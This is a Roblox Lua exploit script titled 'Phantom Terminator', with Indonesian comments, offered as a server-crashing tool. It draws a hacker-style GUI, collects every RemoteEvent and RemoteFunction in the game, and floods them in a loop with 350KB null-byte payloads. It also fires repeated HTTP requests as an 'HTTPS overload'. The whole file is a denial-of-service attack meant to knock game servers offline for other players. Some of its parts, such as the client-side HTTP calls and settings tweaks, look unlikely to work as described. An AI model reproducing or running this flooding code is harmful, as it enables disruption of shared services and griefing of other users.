-- [[ PHANTOM TERMINATOR: ULTIMATE SERVER SHUTDOWN ]] --
-- Logika: Hybrid Remote Flooding + HTTPS Stresser (Anti-Self Lag)

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

local lp = Players.LocalPlayer
local isFlooding = false
local autoIntensity = 280 -- Tenaga optimal untuk crash tanpa bikin client freeze
local payload = string.rep("\0", 350000) -- 350KB Null-Byte Data

-- [[ UI CONSTRUCTION ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "PhantomTerminator"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 360, 0, 400)
Main.Position = UDim2.new(0.5, -180, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.Visible = false
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(255, 0, 0)
Stroke.Thickness = 2

-- [[ TERMINAL MONITOR ]] --
local Monitor = Instance.new("Frame", Main)
Monitor.Size = UDim2.new(0.9, 0, 0, 150)
Monitor.Position = UDim2.new(0.05, 0, 0.05, 0)
Monitor.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", Monitor)

local ConsoleTxt = Instance.new("TextLabel", Monitor)
ConsoleTxt.Size = UDim2.new(1, -20, 1, -20)
ConsoleTxt.Position = UDim2.new(0, 10, 0, 10)
ConsoleTxt.BackgroundTransparency = 1
ConsoleTxt.Text = "> BOOTING PHANTOM_OS...\n> NETWORK_SHIELD: ACTIVE\n> STATUS: STANDBY"
ConsoleTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
ConsoleTxt.Font = Enum.Font.Code
ConsoleTxt.TextSize = 10
ConsoleTxt.TextXAlignment = Enum.TextXAlignment.Left
ConsoleTxt.TextYAlignment = Enum.TextYAlignment.Top

-- PROGRESS BAR ANIMATION
local BarBack = Instance.new("Frame", Monitor)
BarBack.Size = UDim2.new(1, 0, 0, 4)
BarBack.Position = UDim2.new(0, 0, 1, -4)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

-- [[ BRUTAL ATTACK ENGINE ]] --
local function runTerminator()
    local remotes = {}
    -- Scan semua Remote yang ada di dalam game
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end

    task.spawn(function()
        while isFlooding do
            for i = 1, autoIntensity do
                task.defer(function()
                    pcall(function()
                        -- 1. HTTPS OVERLOAD
                        HttpService:GetAsync("https://google.com/gen_204?nocache=" .. tick())
                        
                        -- 2. REMOTE MANIPULATION
                        for r = 1, #remotes do
                            local target = remotes[r]
                            if target:IsA("RemoteEvent") then
                                -- Kirim 3 lapis payload sekaligus
                                target:FireServer(payload, payload, payload)
                            elseif target:IsA("RemoteFunction") then
                                -- Invoke tanpa menunggu (Async) agar client tidak freeze
                                task.spawn(function() target:InvokeServer(payload) end)
                            end
                        end
                    end)
                end)
            end
            -- Jeda mikro untuk proteksi CPU perangkatmu
            task.wait(0.08)
        end
    end)
end

-- [[ ANIMATION LOOP ]] --
task.spawn(function()
    local frames = {"▖", "▘", "▝", "▗"}
    local step = 0
    while true do
        if isFlooding then
            step = step + 1
            local char = frames[step % #frames + 1]
            ConsoleTxt.Text = string.format(
                "> EXECUTING_ATTACK %s\n> BYPASSING_LIMITERS...\n> THREADS: %d\n> INJECTING_MEMORY_NULL\n> STATUS: SERVER_TIMEOUT",
                char, autoIntensity
            )
            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.5)
            task.wait(0.5)
            BarFill.Size = UDim2.new(0, 0, 1, 0)
        else
            ConsoleTxt.Text = "> PHANTOM_OS: ONLINE\n> ENCRYPTION_KEY: ENABLED\n> STATUS: READY_TO_TERMINATE"
            BarFill.Size = UDim2.new(0, 0, 1, 0)
            task.wait(0.5)
        end
    end
end)

-- [[ MAIN EXECUTION BUTTON ]] --
local StartBtn = Instance.new("TextButton", Main)
StartBtn.Size = UDim2.new(0.9, 0, 0, 100)
StartBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
StartBtn.Text = "EXECUTE TERMINATE"
StartBtn.TextColor3 = Color3.new(1,1,1)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 24
Instance.new("UICorner", StartBtn)

StartBtn.MouseButton1Click:Connect(function()
    isFlooding = not isFlooding
    if isFlooding then
        StartBtn.Text = "ABORTING..."
        StartBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        runTerminator()
    else
        StartBtn.Text = "EXECUTE TERMINATE"
        StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    end
end)

-- [[ CLIENT PROTECTION LOGIC ]] --
local function optimizeClient()
    -- Mengurangi beban render agar HP/PC kamu tetap lancar saat menyerang
    settings().Network.IncomingReplicationLag = 0
    RunService:Set3dRenderingEnabled(true) -- Tetap aktif agar bisa melihat keadaan
end

-- [[ TOGGLE ICON & DRAG ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Icon.Image = "rbxassetid://6031094678" -- Icon Tengkorak/Hacker
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
local iStroke = Instance.new("UIStroke", Icon)
iStroke.Color = Color3.fromRGB(255, 0, 0)
iStroke.Thickness = 3

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)

local function makeDraggable(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
makeDraggable(Icon); makeDraggable(Main)

optimizeClient()
print("PHANTOM TERMINATOR LOADED SUCCESSFULLY.")
